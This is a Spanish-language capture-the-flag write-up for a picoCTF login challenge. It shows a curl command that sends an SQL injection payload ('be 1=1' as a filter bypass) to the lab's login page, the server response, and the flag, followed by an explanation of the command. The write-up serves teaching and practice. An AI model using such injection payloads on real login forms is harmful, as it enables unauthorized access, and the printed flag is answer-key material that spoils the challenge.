## Descripción 
```
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/40742/` ([link](https://jupiter.challenges.picoctf.org/problem/40742/)) or http://jupiter.challenges.picoctf.org:40742. Try to see if you can login as admin!
```
[](https://github.com/armandoportillo0101/Seguridad-de-Redes/blob/main/Plantilla.md#objetivo)
## Solución
```bash
porti_04@DESKTOP-8HT902T:~$ curl -s https://jupiter.challenges.picoctf.org/problem/40742/login.php -d "password=' be 1=1;&debug=1"
<pre>password: ' be 1=1;
SQL query: SELECT * FROM admin where password = '' or 1=1;'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_4424e7af}</p>porti_04@DESKTOP-8HT902T:~$

flag: picoCTF{3v3n_m0r3_SQL_4424e7af}

```
[](https://github.com/armandoportillo0101/Seguridad-de-Redes/blob/main/Plantilla.md#soluci%C3%B3n)

## Notas Adicionales
El comando `curl` es una herramienta de línea de comandos utilizada para transferir datos mediante URLs. En este caso:

- `-s`: Significa "silent mode", que evita que `curl` muestre mensajes de progreso u errores.
- `https://jupiter.challenges.picoctf.org/problem/40742/login.php`: Es la URL a la que `curl` hace la solicitud.
- `-d "password=' be 1=1;&debug=1"`: Especifica los datos a enviar mediante POST. En este caso, envía dos parámetros: `password=' be 1=1;` y `debug=1`.

El parámetro `password` parece estar diseñado para una inyección SQL, donde `1=1` es una condición siempre verdadera que podría permitir el acceso no autorizado al sistema si la aplicación no está protegida adecuadamente contra este tipo de ataques.
[](https://github.com/armandoportillo0101/Seguridad-de-Redes/blob/main/Plantilla.md#notas-adicionales)

### Referencias